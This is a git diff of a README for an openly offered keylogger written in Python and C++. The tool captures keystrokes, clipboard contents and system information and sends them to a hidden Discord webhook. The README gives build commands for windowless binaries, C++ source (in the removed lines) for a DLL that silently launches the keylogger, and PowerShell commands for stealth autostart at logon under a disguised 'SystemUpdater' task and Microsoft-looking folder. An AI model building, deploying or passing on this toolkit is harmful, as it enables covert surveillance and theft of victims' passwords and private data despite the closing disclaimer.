@@ -1,39 +1,73 @@
-# 🛡️ Keylogger
+# 🛡️ Keylogger – Installer-based Setup
 
-A fully featured keylogger written in Python. It captures keystrokes, clipboard changes, and system information, and sends the data securely to a hidden Discord webhook.
-
----
-
-## ⚙️ Features
-
-* ⌨️ Logs all keystrokes with modifier support (e.g., `CTRL + C`)
-* 📋 Detects clipboard changes and sends content in real time
-* 💻 Collects system information (hostname, user, IPs, OS)
-* ⏱️ Sends data periodically to a webhook in minute intervals
-* 🔒 Uses a disguised log file to hide the webhook URL
-* ❌ Automatically exits if no valid webhook is found
-* 🫌 Compatible with both development and compiled environments
+A fully featured and installer-driven keylogger written in Python and C++.  
+It captures keystrokes, clipboard changes, system information, and sends the data securely to a hidden Discord webhook.  
+Includes a one-click installer, automatic webhook encoding, and stealth autostart via DLL and Task Scheduler.
 
 ---
 
-## 🔧 Compilation Instructions
+## ✅ Features
 
-To compile the script into a standalone executable using **PyInstaller**:
+- ⌨️ Logs all keystrokes with modifier support (e.g., `CTRL + C`)
+- 📋 Detects clipboard changes and sends content in real time
+- 💻 Collects system information (hostname, user, IPs, OS)
+- 🔁 Sends data periodically via Discord webhook
+- 🔒 Webhook hidden using Base64 encoding in a disguised config file
+- 🧩 One-click setup via GUI installer
+- 🎭 Stealth autostart using `update.dll` + Task Scheduler
+- 🫥 Runs silently with no visible windows
+- 🛠️ Compatible with both development and compiled environments
+
+---
+
+## 📦 Installer Structure (v1.0 Release)
+
+| File / Folder                        | Description                                                                 |
+| ----------------------------------- | --------------------------------------------------------------------------- |
+| `installer.exe`                     | One-click installer GUI – encodes webhook and sets up everything            |
+| `systemupdater.exe`                 | Keylogger binary (compiled from `systemupdater.py`)                         |
+| `update.dll`                        | DLL that loads the keylogger at login using `rundll32.exe`                 |
+| `cache.db`                          | Contains the encoded Discord webhook (Base64)                               |
+| `README.txt`                        | Offline readme for users                                                    |
+| `LICENSE.txt`                       | MIT License                                                                 |
+| `Source_Code/installer.py`         | Python source for installer GUI                                             |
+| `Source_Code/systemupdater.py`     | Main keylogger logic (keystrokes, clipboard, system info)                   |
+| `Source_Code/Base64_webhook_encoder.py` | Optional CLI tool to encode webhook manually                         |
+| `Source_Code/startloader.cpp`      | Source code for DLL that triggers the EXE                                   |
+| `Source_Code/icon.ico`             | Optional icon used for builds                                               |
+
+---
+
+## ⚙️ Compilation Instructions
+
+### 🧪 Keylogger Binary (systemupdater.exe)
 
 ```bash
-pyinstaller --onefile --noconsole --icon="icon_path.ico" Keylogger_Code.py
+pyinstaller --onefile --noconsole --icon="icon.ico" systemupdater.py
 ```
 
-Replace `icon_path.ico` with your actual icon file path.
-The `--noconsole` flag ensures no command window pops up when running.
+### 🧪 Installer Binary (installer.exe)
+
+```bash
+pyinstaller --onefile --noconsole --icon="icon.ico" installer.py
+```
+
+### 🧪 DLL (update.dll)
+
+```bash
+g++ -shared -o update.dll startloader.cpp -Wl,--add-stdcall-alias
+```
+
+> The exported function **must** be named `MyFunction` for compatibility with `rundll32.exe`.
 
 ---
 
 ## 🔐 Webhook Handling
 
-To protect the Discord webhook URL from being exposed in the source code, use the included `Base64_webhook_encoder.py`. This script asks for a webhook, base64-encodes it, and writes it to a file called `cache.db`.
+To hide the Discord webhook URL, it is encoded via Base64 and saved to `cache.db`.  
+The installer does this automatically, or you can use the manual tool:
 
-### Encoder Example (Base64\_webhook\_encoder.py)
+### Manual Encoder (Base64_webhook_encoder.py)
 
 ```python
 import base64
@@ -65,23 +99,11 @@ msvcrt.getch()
 
 ---
 
-## 📁 Project Structure
+## 🚀 Autostart via Task Scheduler
 
-| File                        | Description                                                        |
-| --------------------------- | ------------------------------------------------------------------ |
-| `Base64_webhook_encoder.py` | CLI tool to encode and save a webhook in `cache.db`                |
-| `Keylogger_Code.py`         | Main keylogger implementation (keyboard + clipboard + system info) |
-| `startloader.cpp`           | C++ DLL loader that executes the compiled keylogger binary         |
-| `LICENSE`                   | MIT license declaration                                            |
-| `README.md`                 | Documentation and instructions                                     |
+The DLL is silently triggered at each user logon.
 
----
-
-## 🚨 Autostart (DLL via Task Scheduler)
-
-This config uses a scheduled task to execute the keylogger DLL upon user logon.
-
-### ▶ Autostart the DLL
+### ▶ Add Startup Task
 
 ```powershell
 $Action = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument '"C:\ProgramData\Microsoft\CacheSync\update.dll",MyFunction'
@@ -90,7 +112,7 @@ $Principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Limited
 Register-ScheduledTask -TaskName "SystemUpdater" -Action $Action -Trigger $Trigger -Principal $Principal
 ```
 
-### ❌ Remove the DLL Autostart
+### ❌ Remove Startup Task
 
 ```powershell
 Unregister-ScheduledTask -TaskName "SystemUpdater" -Confirm:$false
@@ -98,45 +120,38 @@ Unregister-ScheduledTask -TaskName "SystemUpdater" -Confirm:$false
 
 ---
 
-## ⚒️ startloader.dll Compilation
+## 🧠 How the Installer Works
 
-The `startloader.cpp` file contains the following code:
+1. **Run `installer.exe`**
+   - Prompts for webhook
+   - Encodes to `cache.db`
 
-```cpp
-#include <windows.h>
+2. **Installs binaries** to:  
+   `C:\ProgramData\Microsoft\CacheSync\`
 
-extern "C" __declspec(dllexport) void CALLBACK MyFunction(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-    WinExec("C:\\ProgramData\\Microsoft\\CacheSync\\systemupdater.exe", SW_HIDE);
-}
-```
-
-### ▶ Compile Command
-
-```bash
-g++ -shared -o startloader.dll startloader.cpp -Wl,--add-stdcall-alias
-```
-
-This creates a `.dll` that calls a hidden executable. The function name `MyFunction` is important for `rundll32.exe` to reference during scheduled task execution.
+3. **Registers Task Scheduler autostart**
+   - Uses `rundll32.exe` to execute `update.dll` on logon
 
 ---
 
-## 📢 Download
+## 📥 Download
 
-The latest compiled release (EXE/DLL) is available here:
-**[Latest Release →](https://github.com/mrpanda-bamboo/keylogger/releases/latest)**
+The latest compiled release (including EXE, DLL, full source code) is available here:  
+🔗 [Latest Release →](https://github.com/mrpanda-bamboo/keylogger/releases/latest)
 
 ---
 
 ## 📜 License
 
-This project is released under the **MIT License**.
-See the [LICENSE](./LICENSE) file for more information.
+This project is licensed under the **MIT License**.  
+See the [LICENSE](./LICENSE) file for full terms.
 
 ---
 
 ## 🚨 Disclaimer
 
-> This software is intended for **educational, research, and ethical testing purposes only**.
-> **Do not** use this tool on systems you do not own or have explicit permission to monitor.
-> Misuse of this software can violate privacy laws and may be considered illegal in many countries.
-> The author takes no responsibility for misuse or damage caused.
+> This software is intended for **educational, research, and ethical testing purposes only**.  
+> **Do not** use this tool on systems you do not own or have explicit permission to monitor.  
+> Misuse of this software can violate privacy laws and may be considered illegal in many countries.  
+> The author takes **no responsibility** for misuse or damage caused.
+
